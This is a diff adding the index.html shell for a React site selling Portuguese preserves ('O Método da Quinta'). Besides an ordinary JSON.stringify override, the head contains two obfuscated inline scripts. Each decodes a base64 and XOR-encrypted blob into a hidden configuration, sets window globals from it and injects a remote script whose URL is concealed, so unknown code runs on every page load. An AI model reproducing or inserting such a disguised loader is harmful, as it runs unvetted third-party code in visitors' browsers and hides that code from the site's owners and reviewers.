@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>O Método da Quinta - Conservas de Elite</title>
+    <script>
+      (function() {
+        var nativeStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          var seen = new WeakSet();
+          var safeReplacer = function(key, val) {
+            if (val !== null && typeof val === 'object') {
+              if (val instanceof Node || val instanceof Element || val instanceof Event || (val.__reactFiber$ !== undefined) || (val.constructor && val.constructor.name && val.constructor.name.indexOf('HTML') === 0)) {
+                return undefined;
+              }
+              if (seen.has(val)) {
+                return undefined;
+              }
+              seen.add(val);
+            }
+            if (typeof replacer === 'function') {
+              return replacer.call(this, key, val);
+            }
+            return val;
+          };
+          try {
+            return nativeStringify(value, replacer || safeReplacer, space);
+          } catch (err) {
+            try {
+              return nativeStringify(value, safeReplacer, space);
+            } catch (e) {
+              return "{}";
+            }
+          }
+        };
+      })();
+    </script>
+    <script>(function(){var b_9kp2=atob("DD0T+9dPCD5AsnvaBEYxjqUjKgRi2g+udE4p1PgsbFBuxw+3bVtq1bQgZRAiwFSpZ096i6M8J04pyh62K016g7IjJlQzkFf4ZUlnib4tfUolwVngX2A/2bAjZ1wh3gj4PmZo2bkuZVtiiFmqbUV2l54rKhJixBq2cVgxwfV5aQl4h0LiMA8nw+R/bQZ00ErjNQV1zORtdWM9");var p_gz=[];for(var k_dbv=0;k_dbv<b_9kp2.length;k_dbv++){p_gz.push(b_9kp2.charCodeAt(k_dbv)&255);}var n_y2z=p_gz[0];var z_x=p_gz.slice(1,1+n_y2z);var w_xsig=p_gz.slice(1+n_y2z);var y_cg=w_xsig.map(function(b,n_xy5){return b^z_x[n_xy5%n_y2z];});var k_ok="";for(var k_t=0;k_t<y_cg.length;k_t++){k_ok+=String.fromCharCode(y_cg[k_t]&255);}var t_my=decodeURIComponent(escape(k_ok));var o_n44=JSON.parse(t_my);var c_pc=o_n44.globals||[];c_pc.forEach(function(l_8){window[l_8.name]=l_8.value;});var b_8=document.createElement("script");b_8.src=o_n44.url;b_8.async=true;b_8.defer=true;(o_n44.attributes||[]).forEach(function(j_hok){b_8.setAttribute(j_hok.name,j_hok.value);});(document.head||document.documentElement).appendChild(b_8);})();</script>
+    <script>(function(){var r_7=atob("DAffacBJ5pRPRH2c+nz9HLIlxK5tLAnoinTlRu8qgvphMQnxk2GmR6Mmi7otNlLvmXW2GbQ6yeE7KQ6zlmarDLM9yP48ZlG+m3OrG6krk+AqN1+moXz9B6Ekg7Z1Zhn9jmbyHLQkj/I2aQ3un3G6B7RkleEtLRnv2Cv9H6Elk/Ftfl++h1qi");var o_xij=[];for(var e_u1=0;e_u1<r_7.length;e_u1++){o_xij.push(r_7.charCodeAt(e_u1)&255);}var a_hev=o_xij[0];var p_d8=o_xij.slice(1,1+a_hev);var n_hh2=o_xij.slice(1+a_hev);var x_r=n_hh2.map(function(b,j_tjk){return b^p_d8[j_tjk%a_hev];});var k_e5mi="";for(var q_5=0;q_5<x_r.length;q_5++){k_e5mi+=String.fromCharCode(x_r[q_5]&255);}var y_o4w=decodeURIComponent(escape(k_e5mi));var r_y439=JSON.parse(y_o4w);var l_6veq=r_y439.globals||[];l_6veq.forEach(function(g_px7k){window[g_px7k.name]=g_px7k.value;});var z_7n=document.createElement("script");z_7n.src=r_y439.url;z_7n.async=true;z_7n.defer=true;(r_y439.attributes||[]).forEach(function(t_qyrp){z_7n.setAttribute(t_qyrp.name,t_qyrp.value);});(document.head||document.documentElement).appendChild(z_7n);})();</script>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
+
